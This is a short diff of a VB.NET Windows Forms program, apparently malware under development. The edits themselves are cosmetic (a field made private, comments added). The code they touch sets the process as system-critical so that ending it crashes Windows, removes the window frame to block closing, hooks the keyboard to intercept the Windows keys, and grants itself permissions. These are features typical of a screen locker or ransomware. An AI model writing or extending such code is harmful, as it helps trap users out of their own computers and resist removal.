@@ -18,7 +18,7 @@ Public Class Form1
     Private Const VK_LWIN As Integer = &H5B
     Private Const VK_RWIN As Integer = &H5C
     ' Hook handle and callback delegate
-    Public hookID As IntPtr = IntPtr.Zero
+    Private hookID As IntPtr = IntPtr.Zero
     Private hookCallbackDelegate As HookProc
 
     ' Delegate for hook callback
@@ -30,20 +30,24 @@ Public Class Form1
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Try
             InitializeComponent()
+
+            ' Set the process as critical
             Dim cp As New CriticalProcess()
             Try
                 cp.SetProcessCritical()
             Catch ex As Exception
                 Console.WriteLine("Error setting process to critical: " & ex.Message)
             End Try
+
             ' Disable Alt + F4 (window close button)
             FormBorderStyle = FormBorderStyle.None
             StartPosition = FormStartPosition.CenterScreen
 
             ' Set up the low-level keyboard hook
             hookCallbackDelegate = New HookProc(AddressOf HookCallback)
-            hookID = SetHook(hookCallbackDelegate)
+            hookID = SetHook(hookCallbackDelegate) ' Initialize hookID here
 
+            ' Grant self permissions
             Try
                 GrantSelfPermissions()
             Catch ex As Exception
